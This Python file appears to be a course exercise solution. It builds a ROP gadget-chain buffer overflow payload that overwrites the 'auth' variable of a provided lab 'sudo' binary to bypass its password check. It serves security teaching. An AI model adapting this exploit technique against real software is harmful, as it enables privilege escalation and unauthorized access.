import os
import sys
import base64
import struct
import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'



def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP Write Gadget, modify the
    `auth` variable and print `Victory!`. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.AUTH` to get the address of the `auth` variable.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change its name/parameters - we are goinag
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    check_pass_ret_addr = addresses.address_to_bytes(0x080488b0)
    registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']
    
    for reg in registers:
        try:
            pop_dest_addr = search.find('pop ' + reg)
            if pop_dest_addr is None:
                continue
            pop_dest_bytes = addresses.address_to_bytes(pop_dest_addr)
            #print(f'Found pop {reg} at {hex(pop_dest_addr)}')
            
            for src_reg in registers:
                if src_reg == reg:
                    continue
                try:
                    pop_addr = search.find('pop ' + src_reg)
                    if pop_addr is None:
                        continue
                    pop_addr_bytes = addresses.address_to_bytes(pop_addr)
                    #print(f'Found pop {src_reg} at {hex(pop_addr)}')
                    
                    mov = search.find('mov [{0}], {1}'.format(reg,src_reg))
                    if mov is None:
                        continue
                    mov_bytes = addresses.address_to_bytes(mov)
                    #print(f'Found mov [{reg}], {src_reg} at {hex(mov)}')
                    
                    # Construct the payload
                    payload = 135 * b'\x01'+ pop_dest_bytes + addresses.address_to_bytes(addresses.AUTH) + pop_addr_bytes + struct.pack("<I", 1) + mov_bytes + check_pass_ret_addr
                    return payload
                except Exception as e:
                    #print(f'Error: {e}')
                    continue
        except Exception as e:
            #print(f'Error: {e}')
            continue
    
    raise ValueError("Couldn't find the necessary gadgets")


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)

